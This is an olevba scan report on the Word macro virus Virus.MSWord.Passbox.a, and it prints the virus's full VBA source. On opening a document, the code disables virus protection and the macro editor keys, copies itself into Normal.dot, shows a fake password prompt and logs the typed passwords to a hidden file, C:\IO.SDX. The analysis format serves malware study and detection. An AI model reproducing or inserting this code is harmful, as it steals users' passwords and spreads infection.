olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Passbox.a-768997b78271766390c2362170aeb37d4d1af2b2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Ômega 
in file: Virus.MSWord.Passbox.a-768997b78271766390c2362170aeb37d4d1af2b2 - OLE stream: 'Ômega'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error GoTo Final

Infecta
Rotula
Tempo

Final:
End Sub
Sub Infecta()
On Error GoTo Final
       
   Application.ScreenUpdating = False
   Application.DisplayAlerts = wdAlertsNone

   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   
   Application.EnableCancelKey = wdCancelDisabled
   
   CustomizationContext = NormalTemplate
   FindKey(BuildKeyCode(wdKeyAlt, wdKeyF8)).Disable
   FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11)).Disable
   

   Set ActiveDoc = ActiveDocument
   Set GlobalDoc = NormalTemplate

   DocumentInstalled = False
   GlobalInstalled = False
   
   For I = 1 To ActiveDocument.VBProject.VBComponents.Count
      If ActiveDocument.VBProject.VBComponents(I).Name = "Ômega" Then
         DocumentInstalled = True
      End If
   Next

   For J = 1 To NormalTemplate.VBProject.VBComponents.Count
      If NormalTemplate.VBProject.VBComponents(J).Name = "Ômega" Then
         GlobalInstalled = True
      End If
   Next
   
      If DocumentInstalled = False Then
         Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Ômega", Object:=wdOrganizerObjectProjectItems
         ActiveDoc.SaveAs FileName:=ActiveDoc.FullName, FileFormat:=wdFormatTemplate
         Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="PassBox", Object:=wdOrganizerObjectProjectItems
         ActiveDoc.SaveAs FileName:=ActiveDoc.FullName, FileFormat:=wdFormatTemplate
      End If
           
     
      If GlobalInstalled = False Then
         Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Ômega", Object:=wdOrganizerObjectProjectItems
         Options.SaveNormalPrompt = False
         Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="PassBox", Object:=wdOrganizerObjectProjectItems
         Options.SaveNormalPrompt = False
      End If
    
      If ActiveDocument.HasPassword = False Then GoTo Final
      PassBox.Show
      
Final:
    End Sub
Sub Rotula()
On Error GoTo CMB

   Set FMB = CommandBars.FindControl(Type:=msoControlPopup, ID:=1)
 With FMB
    If .Caption = " " Then GoTo Final
 End With

CMB:
    Set MB = CommandBars.ActiveMenuBar
    Set NM = MB.Controls.Add(Type:=msoControlPopup, Before:=11)
  NM.Caption = " "
    Set BM = NM.Controls _
      .Add(Type:=msoControlButton, ID:=1)
  BM.Caption = "Ômega"
  BM.FaceId = 308
  BM.OnAction = "Show"
         
Final:
        
End Sub
Sub Show()
 Assistant.Visible = True
        With Assistant.NewBalloon
       .Icon = msoIconTip
       .Heading = "ÔMEGA"
       .Text = "       Word97.Macro  " + Chr(13) + Chr(13) + "        By ORiGaME"
       .Show
        End With

End Sub

Sub Grava()
On Error Resume Next
SetAttr "C:\IO.SDX", 0
Open "C:\IO.SDX" For Append As #1
Print #1, "Path = " + ActiveDocument.FullName
Print #1, "Password = " + PassBox.TextBox1
Print #1, " "
Close #1
SetAttr "C:\IO.SDX", 1 + 2 + 4

Unload PassBox
Application.DisplayAlerts = wdAlertsAll

End Sub

Sub ViewVBCode()

End Sub

Sub Tempo()
On Error GoTo Final
If WeekDay(Now()) = Int(Rnd() * 7 + 1) Then

Set OM = ActiveDocument.Range(Start:=0, End:=0)
 With OM
 .InsertBefore "ÔMEGA" & Chr(13) & "By ORiGaME ©"
 .Font.Name = "Impact"
 .Font.Size = 50
 .Font.ColorIndex = 9
 .Font.Animation = 6
 .Font.Shadow = 1
 End With
End If

Final:
End Sub
-------------------------------------------------------------------------------
VBA MACRO PassBox 
in file: Virus.MSWord.Passbox.a-768997b78271766390c2362170aeb37d4d1af2b2 - OLE stream: 'PassBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




















































Private Sub CommandButton1_Click()
If CommandButton1.Caption = "OK" Then Analise
End Sub
Private Sub TextBox1_Change()
TextBox1.PasswordChar = "*"

End Sub
Private Sub UserForm_Initialize()
Label2.Caption = "Insira a senha para abrir o arquivo"
Label1.Caption = ActiveDocument.FullName

End Sub
Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
On Error GoTo Final
Analise

Final:
End Sub

-------------------------------------------------------------------------------
VBA MACRO ThisDocument 
in file: Virus.MSWord.Passbox.a-768997b78271766390c2362170aeb37d4d1af2b2 - OLE stream: 'ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Passbox.a-768997b78271766390c2362170aeb37d4d1af2b2' - OLE stream: 'Macros/PassBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Passbox.a-768997b78271766390c2362170aeb37d4d1af2b2' - OLE stream: 'Macros/PassBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Passbox.a-768997b78271766390c2362170aeb37d4d1af2b2' - OLE stream: 'Macros/PassBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Passbox.a-768997b78271766390c2362170aeb37d4d1af2b2' - OLE stream: 'Macros/PassBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Cancelar
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Passbox.a-768997b78271766390c2362170aeb37d4d1af2b2' - OLE stream: 'Macros/PassBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Passbox.a-768997b78271766390c2362170aeb37d4d1af2b2' - OLE stream: 'Macros/PassBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Virus.MSWord.Passbox.a-768997b78271766390c2362170aeb37d4d1af2b2' - OLE stream: 'Macros/PassBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Passbox.a-768997b78271766390c2362170aeb37d4d1af2b2' - OLE stream: 'Macros/PassBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Passbox.a-768997b78271766390c2362170aeb37d4d1af2b2' - OLE stream: 'Macros/PassBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.Passbox.a-768997b78271766390c2362170aeb37d4d1af2b2' - OLE stream: 'Macros/PassBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Passbox.a-768997b78271766390c2362170aeb37d4d1af2b2' - OLE stream: 'Macros/PassBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |TextBox1_Change     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

